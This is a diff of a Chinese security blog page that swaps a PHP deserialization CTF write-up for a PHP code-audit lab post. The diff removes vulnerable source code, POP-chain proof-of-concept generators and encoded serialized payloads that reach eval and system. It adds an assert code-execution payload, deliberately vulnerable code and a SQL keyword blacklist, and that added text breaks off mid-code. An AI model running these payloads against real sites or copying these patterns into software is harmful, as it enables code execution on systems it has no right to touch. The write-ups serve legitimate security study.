@@ -15,22 +15,24 @@
 
 
 
-<meta name="description" content="因为比赛原因，所以这篇博客是推迟一星期放出的。主要讲一下上周组会和makerctf校内赛php反序列化题的思路。">
-<meta name="keywords" content="组会内容">
+<meta name="description" content="前言 不仅学到了审计的知识，还学了一种盲注的新姿势。">
+<meta name="keywords" content="代码审计,PHP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="php反序列化组会例题和makerctf easy_unserialize的wp">
-<meta property="og:url" content="http://yoursite.com/2018/05/12/Easy-Unserialize-Writeup/index.html">
+<meta property="og:title" content="PHP代码审计-程序为恰当使用exit导致的问题">
+<meta property="og:url" content="http://yoursite.com/2018/10/04/PHP-Audit-Labs-Day10/index.html">
 <meta property="og:site_name" content="Double--R blog">
-<meta property="og:description" content="因为比赛原因，所以这篇博客是推迟一星期放出的。主要讲一下上周组会和makerctf校内赛php反序列化题的思路。">
+<meta property="og:description" content="前言 不仅学到了审计的知识，还学了一种盲注的新姿势。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/blog/16.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/php-unserialize/test1.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/php-unserialize/test2.jpg">
-<meta property="og:updated_time" content="2018-07-23T01:34:49.262Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/33.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP-Audit-Labs/Day10/1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP-Audit-Labs/Day10/2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP-Audit-Labs/Day10/3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP-Audit-Labs/Day10/4.png">
+<meta property="og:updated_time" content="2018-10-08T15:02:22.007Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="php反序列化组会例题和makerctf easy_unserialize的wp">
-<meta name="twitter:description" content="因为比赛原因，所以这篇博客是推迟一星期放出的。主要讲一下上周组会和makerctf校内赛php反序列化题的思路。">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/blog/16.jpg">
+<meta name="twitter:title" content="PHP代码审计-程序为恰当使用exit导致的问题">
+<meta name="twitter:description" content="前言 不仅学到了审计的知识，还学了一种盲注的新姿势。">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/33.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -62,7 +64,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>php反序列化组会例题和makerctf easy_unserialize的wp | Double--R blog</title>
+<title>PHP代码审计-程序为恰当使用exit导致的问题 | Double--R blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -312,11 +314,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-Easy-Unserialize-Writeup" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-PHP-Audit-Labs-Day10" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/05/12/Easy-Unserialize-Writeup/" class="article-date">
-      <time datetime="2018-05-12T14:57:53.000Z" itemprop="datePublished">2018-05-12</time>
+      <a href="/2018/10/04/PHP-Audit-Labs-Day10/" class="article-date">
+      <time datetime="2018-10-04T06:49:45.000Z" itemprop="datePublished">2018-10-04</time>
 </a>
 
 
@@ -331,7 +333,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      php反序列化组会例题和makerctf easy_unserialize的wp
+      PHP代码审计-程序为恰当使用exit导致的问题
     </h1>
   
 
@@ -340,7 +342,7 @@
 		<span class="post-meta-item-icon">
 			<i class="fa fa-keyboard-o"></i>
 			<span class="post-meta-item-text"> 字数统计: </span>
-			<span class="post-count">1,087字</span>
+			<span class="post-count">1,499字</span>
 		</span>
 	</span>
 	
@@ -349,7 +351,7 @@
 		<span class="post-meta-item-icon">
 			<i class="fa fa-hourglass-half"></i>
 			<span class="post-meta-item-text"> 阅读时长: </span>
-			<span class="post-count">6分</span>
+			<span class="post-count">7分</span>
 		</span>
 	</span>
 </div>
@@ -362,7 +364,7 @@
 
         
     <div class="article-tag tagcloud" style="margin-top:30px;">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/组会内容/">组会内容</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -372,39 +374,56 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p><strong>因为比赛原因，所以这篇博客是推迟一星期放出的。主要讲一下上周组会和makerctf校内赛php反序列化题的思路。</strong></p>
+        <p><strong>前言</strong></p>
+<p>不仅学到了审计的知识，还学了一种盲注的新姿势。</p>
 <hr>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/blog/16.jpg" alt="Alt text"></p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/33.jpg" alt=""></p>
 <a id="more"></a>
-<h4 id="组会例题"><a href="#组会例题" class="headerlink" title="组会例题"></a>组会例题</h4><ul>
-<li><p>题目源码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test1</span><br><span class="line">&#123;</span><br><span class="line">   	public $varr;</span><br><span class="line">   	function __construct()</span><br><span class="line">   	&#123;</span><br><span class="line">   	    $this-&gt;varr = &quot;index.php&quot;;</span><br><span class="line">   	&#125;</span><br><span class="line">   	function __destruct()</span><br><span class="line">   	&#123;</span><br><span class="line">   	    if(file_exists($this-&gt;varr))&#123;</span><br><span class="line">   	        echo &quot;&lt;br /&gt;文件&quot;.$this-&gt;varr.&quot;存在&lt;br /&gt;&quot;;</span><br><span class="line">       	&#125;</span><br><span class="line">   	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class test2</span><br><span class="line">&#123;</span><br><span class="line">   	public $varr;</span><br><span class="line">   	public $obj;</span><br><span class="line">   	function __construct()</span><br><span class="line">   	&#123;</span><br><span class="line">   	    $this-&gt;varr=&apos;123456&apos;;</span><br><span class="line">   	    $this-&gt;obj=null;</span><br><span class="line">   	&#125;</span><br><span class="line">   	function __toString()</span><br><span class="line">   	&#123;</span><br><span class="line">   	    $this-&gt;obj-&gt;execute();</span><br><span class="line">   	    return $this-&gt;varr;</span><br><span class="line">   	&#125;</span><br><span class="line">   	function __destruct()</span><br><span class="line">   	&#123;</span><br><span class="line">   	    echo &quot;&lt;br /&gt;这是f2的析构函数&lt;br /&gt;&quot;;</span><br><span class="line">   	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class test3</span><br><span class="line">&#123;</span><br><span class="line">    public $varr;</span><br><span class="line">    function execute()</span><br><span class="line">    &#123;</span><br><span class="line">   	    eval($this-&gt;varr);</span><br><span class="line">   	&#125;</span><br><span class="line">   	function __destruct()</span><br><span class="line">   	&#123;</span><br><span class="line">   	    echo &quot;&lt;br /&gt;这是f3的析构函数&lt;br /&gt;&quot;;</span><br><span class="line">   	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">   	if (isset($_GET[&apos;x&apos;])) &#123;</span><br><span class="line">   	unserialize($_GET[&apos;x&apos;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>   目标：打出phpinfo。</p>
-<p>   代码分析：</p>
-<p>在test3类里有一个execute()函数，函数作用是将公有变量varr的值作为php代码执行。那么我们只要让变量varr的值为”phpinfo();”然后执行execute()函数就行了。但test3只定义了execute()函数，真正调用函数是在test2的<strong>toString函数里面，而且是通过”$this-&gt;obj-&gt;execute()”这样的形似调用的，而obj是test2中的一个变量。所以我们要定义obj为test3对象，这样才能调用test3类中的execute()函数。而test2的</strong>toString()函数被自动调用的条件是test2对象作为字符串使用。在test1类中的<strong>destruct()函数中有一个字符串的点拼接。其中$this-&gt;varr变量被拼接了，那么我们只要定义test1中的varr变量为test2对象，就能调用test2的</strong>toString()函数，就能调用test3的execute()函数，就能执行phpinfo()。</p>
-<p>生成POC的代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test1&#123;</span><br><span class="line">	public $varr;</span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$this-&gt;varr = new test2();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class test2&#123;</span><br><span class="line">	public $obj;</span><br><span class="line">	public $varr;</span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$this-&gt;obj= new test3();</span><br><span class="line">		$this-&gt;varr= &apos;123456&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">	function __toString()</span><br><span class="line">   	&#123;</span><br><span class="line">       	$this-&gt;obj-&gt;execute();</span><br><span class="line">       	return $this-&gt;varr;</span><br><span class="line">   	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class test3</span><br><span class="line">&#123;</span><br><span class="line">   	public $varr;</span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$this-&gt;varr = &quot;phpinfo();&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">   	function execute()</span><br><span class="line">   	&#123;</span><br><span class="line">   	    eval($this-&gt;varr);</span><br><span class="line">   	&#125;</span><br><span class="line">&#125;	</span><br><span class="line">$poc = new test1();</span><br><span class="line">echo urlencode(serialize($poc));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>   POC:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A5%3A%22test1%22%3A1%3A%7Bs%3A4%3A%22varr%22%3BO%3A5%3A%22test2%22%3A2%3A%7Bs%3A3%3A%22obj%22%3BO%3A5%3A%22test3%22%3A1%3A%7Bs%3A4%3A%22varr%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7Ds%3A4%3A%22varr%22%3Bs%3A6%3A%22123456%22%3B%7D%7D</span><br></pre></td></tr></table></figure>
-<p>   结果：</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/php-unserialize/test1.jpg" alt="Alt text"></p>
-</li>
-</ul>
-<h4 id="makerctf-easy-unserialize"><a href="#makerctf-easy-unserialize" class="headerlink" title="makerctf easy_unserialize"></a>makerctf easy_unserialize</h4><ul>
-<li><p>题目源码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class gg</span><br><span class="line">&#123;</span><br><span class="line">    private $gg;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;gg-&gt;get1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class start</span><br><span class="line">&#123;</span><br><span class="line"> 	private $start1;</span><br><span class="line"> 	private $start2;</span><br><span class="line"> 	public function get1()</span><br><span class="line"> 	&#123;</span><br><span class="line"> 	    $s1 = $this-&gt;start1;</span><br><span class="line"> 	    $s2 = $this-&gt;start2;</span><br><span class="line"> 	    $s1($s2);</span><br><span class="line"> 	&#125;</span><br><span class="line">&#125;	</span><br><span class="line"></span><br><span class="line">class cat</span><br><span class="line">&#123;</span><br><span class="line">    private $name = &quot;蛋黄&quot;;</span><br><span class="line">    private $color = &quot;橘色&quot;;</span><br><span class="line">    private $weight = &quot;5公斤&quot;;</span><br><span class="line"></span><br><span class="line">    public function getName()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getColor()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;color;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> 	public function getWeight()</span><br><span class="line"> 	&#123;</span><br><span class="line"> 	    return $this-&gt;weight;</span><br><span class="line"> 	&#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke($args)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $args.&quot;不是函数&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class test2</span><br><span class="line">&#123;</span><br><span class="line">    private $a;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;a-&gt;getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class flag</span><br><span class="line">&#123;</span><br><span class="line">    public function getFlag()</span><br><span class="line">    &#123;</span><br><span class="line">        system(&apos;cat ../flag.txt&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$x = $_GET[&apos;x&apos;];</span><br><span class="line">if (isset($x)) &#123;</span><br><span class="line">    unserialize($x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<pre><code>代码分析：
-</code></pre><p>flag类里面有一个getFlag函数，作用是包含一个本地文件，内有flag。定义a为flag对象就可以在test2的<strong>toString()函数中调用getFlag()函数。在cat类中有</strong>invoke($args)函数做字符串的点拼接，定义$args为test2对象就可以在调用<strong>toString()函数。当对象以函数的形式调用时，</strong>invoke()函数自动调用。在start类中有get1函数，里面有$s1($s2)形式，当$s1为cat对象，$s2为test2对象时，调用<strong>invoke()和</strong>toString()。当gg类中的gg变量为start对象，就能调用get1函数。</p>
-<pre><code>生成POC的代码：
-</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class gg</span><br><span class="line">&#123;</span><br><span class="line">    private $gg;</span><br><span class="line"></span><br><span class="line">	public function __construct()</span><br><span class="line">	&#123;</span><br><span class="line">		$this-&gt;gg = new start();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">class start</span><br><span class="line">&#123;</span><br><span class="line">    private $start1;</span><br><span class="line">    private $start2;</span><br><span class="line">	public function __construct()</span><br><span class="line">	&#123;</span><br><span class="line">		$this-&gt;start1 = new cat();</span><br><span class="line">		$this-&gt;start2 = new test2();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;	</span><br><span class="line"></span><br><span class="line">class cat</span><br><span class="line">&#123;</span><br><span class="line">    public function __invoke($args)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $args.&quot;不是函数&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class test2</span><br><span class="line">&#123;</span><br><span class="line">    private $a;</span><br><span class="line">	public function __construct()</span><br><span class="line">	&#123;</span><br><span class="line">		$this-&gt;a = new flag();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class flag</span><br><span class="line">&#123;</span><br><span class="line">    public function getFlag()</span><br><span class="line">    &#123;</span><br><span class="line">        system(&apos;cat ../flag.txt&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$poc = new gg();</span><br><span class="line">echo urlencode(serialize($poc));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<pre><code>POC:
-</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A2%3A%22gg%22%3A1%3A%7Bs%3A6%3A%22%00gg%00gg%22%3BO%3A5%3A%22start%22%3A2%3A%7Bs%3A13%3A%22%00start%00start1%22%3BO%3A3%3A%22cat%22%3A0%3A%7B%7Ds%3A13%3A%22%00start%00start2%22%3BO%3A5%3A%22test2%22%3A1%3A%7Bs%3A8%3A%22%00test2%00a%22%3BO%3A4%3A%22flag%22%3A0%3A%7B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure>
-<pre><code>结果：
-</code></pre><p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/photo/php-unserialize/test2.jpg" alt="Alt text"></p>
 <hr>
-<p><div align=""><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=539941039&auto=1&height=66"></iframe></div></p>
-</li>
-</ul>
+<h2 id="DAY10-Anticipation"><a href="#DAY10-Anticipation" class="headerlink" title="DAY10-Anticipation"></a>DAY10-Anticipation</h2><p>题目叫预期，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract(_POST);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">goAway</span><span class="params">()</span></span>&#123;</span><br><span class="line">	error_log(<span class="string">"Hacking attemp."</span>);</span><br><span class="line">	header(<span class="string">'Location:/error/'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(pi)||!is_numeric($pi))&#123;</span><br><span class="line">	goAway（）；</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!assert(<span class="string">"(int)$pi == 3"</span>))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"This is not pi."</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"This might be pi."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>漏洞解析：</strong></p>
+<p>这道题目实际上讲的是当检测到攻击时，虽然有相应的防御操作，但是程序未立即停止退出，导致程序继续执行的问题。程序在 <strong>第一行处</strong> 使用 <strong>extract</strong> 函数，将 <strong>POST</strong> 请求的数据全都注册成变量， <strong>extract</strong> 函数的定义如下：</p>
+<blockquote>
+<p><a href="http://php.net/manual/zh/function.extract.php" target="_blank" rel="noopener"> extract </a> ：(PHP 4, PHP 5, PHP 7)</p>
+<p><strong>功能</strong> ：从数组中将变量导入到当前的符号表</p>
+<p><strong>定义</strong> ： <code>int extract ( array &amp;$array [, int $flags = EXTR_OVERWRITE [, string $prefix = NULL ]] )</code></p>
+</blockquote>
+<p>该函数实际上就是把数组中的键值对注册成变量，键名成为变量名，键值成为变量值。</p>
+<p>这样我们就可以控制 <strong>第7行</strong> 处的 <strong>pi</strong>  变量。程序对 <strong>pi</strong>  变量进行简单的验证，如果不是数字或者没有设置 <strong>pi</strong>  变量，程序就会执行 <strong>goAway</strong> 方法，即记录错误信息并直接重定向到 <strong>/error/</strong> 页面。看来程序员这里是对非法的操作进行了一定的处理。但是关键在于，程序在处理完之后，没有立即退出，这样程序又会按照流程执行下去，也就到了 <strong>第11行</strong> 的 <strong>assert</strong> 语句。由于前面 <strong>pi</strong>  变量可以被用户控制，所以在这一行存在远程代码执行漏洞。例如我们的payload为：pi=phpinfo()，虽然我们无法直接看到phpinfo的页面，但是通过抓包我们能看到程序的确执行了phpinfo</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/PHP-Audit-Labs/Day10/1.png" alt=""></p>
+<p>实际上，这样的漏洞在真实环境中还不少，很多的CMS通过检测是否存在install.lock文件来判断是否安装过，如果安装过就直接将用户重定向到网站首页，但很多时候却忘记直接退出程序，从而导致网站重装漏洞的发生。</p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>这是一道由于没有及时退出而导致的注入漏洞，下来看看代码</p>
+<p><strong>题目代码：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stophack</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_array($string))&#123;</span><br><span class="line">        <span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            $string[$key] = stophack($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $raw = $string;</span><br><span class="line">        $replace = <span class="keyword">array</span>(<span class="string">"\\"</span>,<span class="string">"\""</span>,<span class="string">"'"</span>,<span class="string">"/"</span>,<span class="string">"*"</span>,<span class="string">"%5C"</span>,<span class="string">"%22"</span>,<span class="string">"%27"</span>,<span class="string">"%2A"</span>,<span class="string">"~"</span>,<span class="string">"insert"</span>,<span class="string">"update"</span>,<span class="string">"delete"</span>,<span class="string">"into"</span>,<span class="string">"load_file"</span>,<span class="string">"outfile"</span>,<span class="string">"sleep"</span>,);</span><br><span class="line">        $string = str_ireplace($replace, <span class="string">"HongRi"</span>, $string);</span><br><span class="line">        $string = strip_tags($string);</span><br><span class="line">        <span class="keyword">if</span>($raw!=$string)&#123;</span><br><span class="line">            error_log(<span class="string">"Hacking attempt."</span>);</span><br><span class="line">            header(<span class="string">'Location: /error/'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> trim($string);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $dbname);</span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"连接失败: "</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) &amp;&amp; $_GET[<span class="string">'id'</span>])&#123;</span><br><span class="line">    $id = stophack($_GET[<span class="string">'id'</span>]);</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM students WHERE id=$id"</span>;</span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    <span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        $row = $result-&gt;fetch_assoc();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;h1&gt;查询结果为：&lt;/h1&gt;&lt;pre&gt;'</span>.<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">        +----+---------+--------------------+-------+</span></span><br><span class="line"><span class="string">        | id | name    | email              | score |</span></span><br><span class="line"><span class="string">        +----+---------+--------------------+-------+</span></span><br><span class="line"><span class="string">        |  <span class="subst">&#123;$row['id']&#125;</span> | <span class="subst">&#123;$row['name']&#125;</span>   | <span class="subst">&#123;$row['email']&#125;</span>   |   <span 